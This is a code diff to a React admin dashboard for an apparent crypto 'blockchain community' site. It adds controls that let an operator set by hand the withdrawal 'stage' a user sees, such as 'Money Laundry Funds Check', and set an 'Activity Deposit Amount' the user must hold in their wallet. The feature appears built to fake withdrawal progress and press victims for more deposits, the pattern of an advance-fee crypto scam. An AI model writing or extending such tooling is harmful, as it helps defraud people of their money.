@@ -18,6 +18,7 @@ import {
 import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle, DialogFooter } from "@/components/ui/dialog";
 import { ShieldAlert, RefreshCw, Trash2, Lock, Plus, UserCheck, FileText, FolderOpen, Edit3, History, User, Users, LogOut, ShieldCheck, Key, ExternalLink, X, MessageCircle, Send, Bell, AlertTriangle, Clock, CheckCircle, Image, Wallet, Upload, Mail, MailCheck, MapPin, Settings, Moon, Sun, BarChart3, TrendingUp, Activity, Save, LayoutDashboard, Eye, Zap, Pin, StickyNote, ChevronDown, Globe, Languages } from "lucide-react";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
+import { Switch } from "@/components/ui/switch";
 import { BarChart, Bar, XAxis, YAxis, CartesianGrid, Tooltip, ResponsiveContainer, PieChart, Pie, Cell, LineChart, Line, Legend } from "recharts";
 import ibcLogo from "@assets/generated_images/professional_corporate_logo_for_international_blockchain_community.png";
 import { useToast } from "@/hooks/use-toast";
@@ -53,6 +54,9 @@ interface Case {
   assignedTo?: string;
   tags?: string;
   internalNotes?: string;
+  showWithdrawalProgress?: boolean;
+  withdrawalStage?: string;
+  activityDepositAmount?: string;
   createdAt: string;
   updatedAt: string;
 }
@@ -342,6 +346,9 @@ export default function AdminDashboard() {
   });
   const [depositAddressEdit, setDepositAddressEdit] = useState("");
   const [profileRedirectEdit, setProfileRedirectEdit] = useState("");
+  const [showWithdrawalProgressEdit, setShowWithdrawalProgressEdit] = useState(false);
+  const [withdrawalStageEdit, setWithdrawalStageEdit] = useState("0");
+  const [activityDepositAmountEdit, setActivityDepositAmountEdit] = useState("");
   
   // Search and filter state
   const [searchQuery, setSearchQuery] = useState("");
@@ -1360,6 +1367,9 @@ export default function AdminDashboard() {
     setDepositAddressEdit(caseData.depositAddress || "");
     setProfileRedirectEdit(caseData.profileRedirectUrl || "");
     setLandingPageEdit(caseData.landingPage || "dashboard");
+    setShowWithdrawalProgressEdit(caseData.showWithdrawalProgress || false);
+    setWithdrawalStageEdit(caseData.withdrawalStage || "0");
+    setActivityDepositAmountEdit(caseData.activityDepositAmount || "");
     setIsAdminMessageOpen(true);
   };
 
@@ -1487,6 +1497,29 @@ export default function AdminDashboard() {
       }
     } catch (error) {
       toast({ variant: "destructive", title: "Error", description: "Failed to update landing page." });
+    }
+  };
+
+  const updateWithdrawalProgress = async () => {
+    if (!selectedCase) return;
+    
+    try {
+      const res = await fetch(`/api/cases/${selectedCase.id}`, {
+        method: 'PATCH',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ 
+          showWithdrawalProgress: showWithdrawalProgressEdit,
+          withdrawalStage: withdrawalStageEdit,
+          activityDepositAmount: activityDepositAmountEdit
+        })
+      });
+      
+      if (res.ok) {
+        loadData();
+        toast({ title: "Updated", description: "Withdrawal progress settings have been saved." });
+      }
+    } catch (error) {
+      toast({ variant: "destructive", title: "Error", description: "Failed to update withdrawal progress." });
     }
   };
 
@@ -4442,6 +4475,87 @@ export default function AdminDashboard() {
                     </Button>
                   </div>
                 </div>
+              </div>
+            </div>
+
+            {/* SECTION: Withdrawal Progress */}
+            <div className="space-y-4">
+              <div className="flex items-center gap-2 pb-2">
+                <div className="h-6 w-6 rounded bg-emerald-500/20 flex items-center justify-center">
+                  <TrendingUp className="h-3.5 w-3.5 text-emerald-400" />
+                </div>
+                <h3 className="text-sm font-semibold text-emerald-400 uppercase tracking-wide">Withdrawal Progress</h3>
+              </div>
+              
+              <div className="p-4 bg-gradient-to-br from-emerald-500/10 to-green-500/5 rounded-xl border border-emerald-500/20">
+                <p className="text-xs text-slate-400 mb-4">Control the withdrawal progress display shown to the user on their dashboard.</p>
+                
+                {/* Toggle to show/hide progress */}
+                <div className="flex items-center justify-between p-3 bg-slate-800/50 rounded-lg mb-4">
+                  <div>
+                    <Label className="text-slate-300 font-medium">Show Progress to User</Label>
+                    <p className="text-xs text-slate-500">When enabled, user will see the progress tracker on their dashboard</p>
+                  </div>
+                  <Switch
+                    checked={showWithdrawalProgressEdit}
+                    onCheckedChange={setShowWithdrawalProgressEdit}
+                    data-testid="switch-show-progress"
+                  />
+                </div>
+                
+                {/* Stage selector */}
+                <div className="space-y-2 mb-4">
+                  <Label className="text-slate-300 text-xs font-medium">Current Stage</Label>
+                  <Select value={withdrawalStageEdit} onValueChange={setWithdrawalStageEdit}>
+                    <SelectTrigger className="bg-slate-800/70 border-slate-700" data-testid="select-withdrawal-stage">
+                      <SelectValue />
+                    </SelectTrigger>
+                    <SelectContent>
+                      <SelectItem value="0">
+                        <span className="flex items-center gap-2">🚀 Stage 1: Withdrawal Process Initiated</span>
+                      </SelectItem>
+                      <SelectItem value="1">
+                        <span className="flex items-center gap-2">✅ Stage 2: First Stage Verification Completed</span>
+                      </SelectItem>
+                      <SelectItem value="2">
+                        <span className="flex items-center gap-2">🏦 Stage 3: Financial Department Verification</span>
+                      </SelectItem>
+                      <SelectItem value="3">
+                        <span className="flex items-center gap-2">⛏️ Stage 4: Miners Department</span>
+                      </SelectItem>
+                      <SelectItem value="4">
+                        <span className="flex items-center gap-2">🔍 Stage 5: Money Laundry Funds Check</span>
+                      </SelectItem>
+                      <SelectItem value="5">
+                        <span className="flex items-center gap-2">⚙️ Stage 6: Final Withdrawal Processing</span>
+                      </SelectItem>
+                      <SelectItem value="6">
+                        <span className="flex items-center gap-2">🎉 Stage 7: Withdrawal Now Released</span>
+                      </SelectItem>
+                    </SelectContent>
+                  </Select>
+                </div>
+                
+                {/* Activity deposit amount */}
+                <div className="space-y-2 mb-4">
+                  <Label className="text-slate-300 text-xs font-medium">Activity Deposit Amount</Label>
+                  <p className="text-xs text-slate-500">Amount the user needs to keep in their wallet (e.g., "50,000 USDT")</p>
+                  <Input
+                    value={activityDepositAmountEdit}
+                    onChange={(e) => setActivityDepositAmountEdit(e.target.value)}
+                    placeholder="e.g., 50,000 USDT"
+                    className="bg-slate-800/70 border-slate-700"
+                    data-testid="input-activity-deposit"
+                  />
+                </div>
+                
+                <Button 
+                  onClick={updateWithdrawalProgress} 
+                  className="w-full bg-emerald-600 hover:bg-emerald-700"
+                  data-testid="button-save-progress"
+                >
+                  <Save className="h-4 w-4 mr-2" /> Save Progress Settings
+                </Button>
               </div>
             </div>
 
